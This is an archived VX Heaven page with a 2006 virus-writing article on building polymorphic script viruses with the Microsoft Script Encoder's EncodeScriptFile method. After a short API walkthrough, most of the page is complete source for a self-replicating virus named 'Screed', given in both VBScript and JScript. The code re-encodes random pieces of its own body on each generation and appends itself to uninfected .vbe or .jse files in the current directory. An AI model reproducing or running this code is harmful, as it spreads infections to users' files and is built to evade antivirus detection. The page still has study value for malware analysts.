<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> roy g biv 'Polymorphism using the Microsoft Script Encoder' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="roy g biv"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, roy g biv,Polymorphism using the Microsoft Script Encoder, file, encoder, article, encoded, parts, method, string, encode, encodescriptfile, body, scripting, vbscript, make, "/>
<meta name="Description" content="I got this idea from the Virus Bulletin article about the Microsoft Script Encoder. (www.virusbtn.com/virusbulletin/archive/2006/01/vb200601/pdf) That article mentions the EncodeScriptFile method that no-one noticed before, so I looked at it, to see what it could do. Amazingly, it can be used to encode any string that is passed to it. It is even documented on Microsoft's website!"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"56567d3efbf0ef565df28edcd17c16593e723465-1498756990-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrg06.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Polymorphism using the Microsoft Script Encoder</h1><p><a href="/lib/?lang=en&amp;author=roy%20g%20biv"> roy g biv</a><br/> <em><a href="/vx.php?fid=1512#f1512">Ready Rangers Liberation Front [7]</a></em><br/> <em>March 2006</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrg06.html';</script><div class="ci"><a href="/lib/?ci=vrg06">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vrg06">Back to index</a>] [<a href="/lib/vrg06.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">What is it?</a></li>
<li><a href="#c2">How to use it?</a></li>
<li><a href="#c3">How to make polymorphic?</a></li>
<li><a href="#c4">Greets to friendly people (A-Z)</a></li>
</ul>
<h2><a name="c1"></a>What is it?</h2>
<p>I got this idea from the Virus Bulletin article about the Microsoft Script Encoder. (www.virusbtn.com/virusbulletin/archive/2006/01/vb200601/pdf) That article mentions the EncodeScriptFile method that no-one noticed before, so I looked at it, to see what it could do. Amazingly, it can be used to encode any string that is passed to it. It is even documented on Microsoft's website!</p>
<h2><a name="c2"></a>How to use it?</h2>
<p>The EncodeScriptFile function is a method of the "Scripting.Encoder" object. To use it, just do this:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> encoder = <span style="color: #E56717; font-weight: bold;">CreateObject</span>(<span style="color: #800000;">&quot;Scripting.Encoder&quot;</span>) &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'VBScript<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; encoder = <span style="color: #E56717; font-weight: bold;">new</span> ActiveXObject(<span style="color: #800000;">&quot;Scripting.Encoder&quot;</span>)&nbsp; &nbsp; &nbsp; &nbsp; //JScript<br/>
&nbsp;</div>
<p>Then call encoder.EncodeScriptFile with the proper parameters. There are four parameters to pass to that method. They are the file extension (only certain file types can be encoded), the string to encode, some optional flags, and the language to use (can be empty). The encoded string is returned. Here is an example of how to use it:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; message = <span style="color: #800000;">&quot;this is a test&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; to_encode = <span style="color: #800000;">&quot;WScript.echo(message)&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; encoded = encoder.EncodeScriptFile(<span style="color: #800000;">&quot;.js&quot;</span>, to_encode, 0, 0)<br/>
&nbsp;</div>
<p>I use .JS as extension, because it is shortest, and works in VBScript, too.</p>
<h2><a name="c3"></a>How to make polymorphic?</h2>
<p>Now we have our first step, which allows us to encode anything we want. The next step relies on the information from the article that I never thought to try before. In fact, there are several things in that article that we use all together. One is that the script can appear anywhere in the file, not just at the start of the file. Next is that not the whole file has to be encoded, so we can have some parts encoded and other parts not encoded, and it will still work. Finally is that multiple scripts can appear in the same file, so we can have lots of pieces of both encoded and not-encoded next to each other, that covers the whole body. We can achieve that by calling the EncodeScriptFile method multiple times and passing different parts of our body. We can choose random amounts of the body to pass to the method. Here is an example of that in VBScript:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; randomize &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'let's make it different every time<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; e=1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'starting position<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">while</span> e&lt;=len(b) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'process entire body<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f=int(rnd()*3)+1&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'get randomly 1-3 characters<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; d=d+encoder.EncodeScriptFile(<span style="color: #800000;">&quot;.js&quot;</span>,mid(b,e,f),0,0)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'encode those characters and append<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; g=int(rnd()*3)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'get 0-2 characters<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; d=left(d,len(d)-1)+mid(b,e+f,g)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'don't encode those characters and append<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e=e+f+g &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'update count<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; wend&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'continue<br/>
</span></div>
<p>Here is the same code in JScript:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">with<span style="color: black;">&#40;</span><span style="">Math</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; random<span style="color: black;">&#40;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//let's make it different every time</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; f<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//starting position</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; while<span style="color: black;">&#40;</span>f<span style="color: #339933;">&lt;</span>b.<span style="color: #660066;">length</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//process entire body</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e<span style="color: #339933;">+=</span>encoder.<span style="color: #660066;">EncodeScriptFile</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.js&quot;</span><span style="color: #339933;">,</span>b.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>f<span style="color: #339933;">,</span>g<span style="color: #339933;">=</span>round<span style="color: black;">&#40;</span>random<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #CC0000;">3</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//get randomly 1-3 characters, encode those characters, and append</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e<span style="color: #339933;">=</span>e.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span>e.<span style="color: #660066;">length</span><span style="color: #339933;">-</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span>b.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>f<span style="color: #339933;">+=</span>g<span style="color: #339933;">,</span>h<span style="color: #339933;">=</span>round<span style="color: black;">&#40;</span>random<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #CC0000;">3</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//get 0-2 characters, don't encode those characters</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f<span style="color: #339933;">+=</span>h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//update count and continue</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>That's the easy part. We still have to decide the source of what we want to encode. Since we don't have any kind of DecodeStringFile method, we need to carry our own source, and that is actually tricky. The problem with that is because we need to say "source=" followed by our source, and then to execute it, but the encoded source must also begin with "source=", which can lead to an infinite recursion if we try to do it in one pass. It took me a long time to work out how to do it, but eventually I got it. I just had to build the string in two passes. The first pass is the ordinary source, and the second pass prepends the "source=" part. Of course, the source cannot contain any quotation marks in that case, so it is necessary to append some code to do a replacement at runtime. Here is the code in VBScript, must be single line:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">a=chr(34)<br/>
b=<span style="color: #800000;">&quot;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; b=Ga=chr(34)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ''G' is replaced by '&quot;</span><span style="color: black; font-style: italic;">' later<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; b=G+a+b+a+G &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'build self-referencing source<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; execute(replace(b,chr(71),a))G&nbsp; <span style="color: black; font-style: italic;">'replace 'G' with '&quot;'<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; c=Gscripting.G<br/>
&nbsp; &nbsp; &nbsp; &nbsp; d=GG<br/>
&nbsp; &nbsp; &nbsp; &nbsp; randomize &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'let's make it different every time<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; e=1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'starting position<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">while</span> e&lt;=len(b) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'process entire body<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f=int(rnd()*3)+1&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'get randomly 1-3 characters<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; d=d+<span style="color: #E56717; font-weight: bold;">createobject</span>(c+GencoderG).encodescriptfile(G.jsG,mid(b,e,f),0,0)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'encode those characters and append<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; g=int(rnd()*3)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'get 0-2 characters<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; d=left(d,len(d)-1)+mid(b,e+f,g)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'don't encode those characters and append<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e=e+f+g &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'update count<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; wend&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'continue<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">on</span> <span style="color: #151B8D; font-weight: bold;">error</span> <span style="color: #151B8D; font-weight: bold;">resume</span> <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> e=<span style="color: #E56717; font-weight: bold;">createobject</span>(c+GfilesystemobjectG)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">for</span> <span style="color: #8D38C9; font-weight: bold;">each</span> f <span style="color: #8D38C9; font-weight: bold;">in</span> e.getfolder(G.G).files<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'demo version, current directory only<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> lcase(e.getextensionname(f))=GvbeGthen<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'only .vbe can contain encoded VBScripts<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; g=f.attributes<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f.attributes=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> instr(e.opentextfile(f).readall,G#@~G)=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">then</span> e.opentextfile(f,8).write vbcrlf+d<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'append if not infected aleady<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f.attributes=g<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'Screed - roy g biv 02/03/06<br/>
</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800000;">&quot;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; execute(replace(b,&quot;</span>G<span style="color: #800000;">&quot;,a)) &nbsp; &nbsp; &nbsp; 'first generation replacement<br/>
</span></div>
<p>Here is the code in JScript, must be single line:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">a<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\&quot;</span>&quot;</span><br/>
b<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; b=Ga=String.fromCharCode(34)&nbsp; &nbsp; //'G' is replaced by '&quot;</span><span style="color: #3366CC;">' later<br/>
&nbsp; &nbsp; &nbsp; &nbsp; b=G+a+b+a+G &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //build self-referencing source<br/>
&nbsp; &nbsp; &nbsp; &nbsp; eval(b.replace(new RegExp(String.fromCharCode(71),G+a+GgG+a+G),a))G<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //replace '</span>G<span style="color: #3366CC;">' with '</span><span style="color: #3366CC;">&quot;'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; c=ActiveXObject<br/>
&nbsp; &nbsp; &nbsp; &nbsp; d=Gscripting.G<br/>
&nbsp; &nbsp; &nbsp; &nbsp; e=GG<br/>
&nbsp; &nbsp; &nbsp; &nbsp; with(Math)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; random(1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //let's make it different every time<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f=0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //starting position<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while(f&lt;b.length) &nbsp; &nbsp; &nbsp; //process entire body<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e+=new c(d+GencoderG).encodescriptfile(G.jsG,b.substr(f,g=round(random()*3)+1),0,0)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //get randomly 1-3 characters, encode those characters, and append<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e=e.substr(0,e.length-1)+b.substr(f+=g,h=round(random()*3))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //get 0-2 characters, don't encode those characters<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f+=h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //update count and continue<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; f=new c(d+GfilesystemobjectG)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; with(new Enumerator(f.getfolder(G.G).files))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //demo version, current directory only<br/>
&nbsp; &nbsp; &nbsp; &nbsp; for(;!atEnd();moveNext())<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(f.getextensionname(g=item()).toLowerCase()==GjseG)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //only .jse can contain encoded VBScripts<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; h=g.attributes<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; g.attributes=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(f.opentextfile(g).readall().search(/#@~/)&amp;lt;0)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f.opentextfile(g,8).write(String.fromCharCode(10)+e)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //append if not infected aleady<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; g.attributes=h<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; catch(z){}<br/>
&nbsp; &nbsp; &nbsp; &nbsp; //Screed - roy g biv 02/03/06<br/>
&quot;</span><br/>
eval<span style="color: black;">&#40;</span>b.<span style="color: #660066;">replace</span><span style="color: black;">&#40;</span><span style="color: #009966; font-style: italic;">/G/g</span><span style="color: #339933;">,</span>a<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//first generation replacement</span><br/>
&nbsp;</div>
<h2><a name="c4"></a>Greets to friendly people (A-Z)</h2>
<p>Active - Benny - Obleak - Prototype - Ratter - Ronin - RT Fishel - sars - SPTH - The Gingerbread Man - Ultras - uNdErX - Vallez - Vecna - VirusBuster - Whitehead</p>
